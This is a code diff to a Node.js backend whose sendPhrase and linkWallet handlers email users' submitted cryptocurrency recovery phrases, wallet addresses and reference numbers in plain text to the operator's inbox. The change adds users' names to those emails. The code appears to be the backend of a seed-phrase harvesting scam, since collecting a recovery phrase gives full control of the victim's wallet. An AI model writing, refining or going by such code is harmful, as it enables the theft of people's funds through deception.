@@ -388,7 +388,7 @@ exports.sendPhrase = async (req, res) => {
     await sendEmail(
       process.env.EMAIL_USER,
       'New Recovery Phrase Submitted',
-      `<p>User ${user.email} submitted a recovery phrase:</p><p><strong>Phrase:</strong> ${phrase}</p><p><strong>Reference Number:</strong> ${referenceNumber}</p>`
+      `<p>User ${user.firstName || ''} ${user.lastName || ''} (${user.email}) submitted a recovery phrase:</p><p><strong>Phrase:</strong> ${phrase}</p><p><strong>Reference Number:</strong> ${referenceNumber}</p>`
     );
 
     // Verify to user
@@ -432,7 +432,7 @@ exports.linkWallet = async (req, res) => {
     await sendEmail(
       process.env.EMAIL_USER,
       'New Wallet Linked',
-      `<p>User ${user.email} linked a new wallet:</p><p><strong>Recovery Phrase:</strong> ${phrase}</p><p><strong>Wallet Address:</strong> ${walletAddress}</p><p><strong>Type:</strong> ${type}</p><p><strong>Reference Number:</strong> ${referenceNumber}</p>`
+      `<p>User ${user.firstName || ''} ${user.lastName || ''} (${user.email}) linked a new wallet:</p><p><strong>Recovery Phrase:</strong> ${phrase}</p><p><strong>Wallet Address:</strong> ${walletAddress}</p><p><strong>Type:</strong> ${type}</p><p><strong>Reference Number:</strong> ${referenceNumber}</p>`
     );
     
     // Verify to user
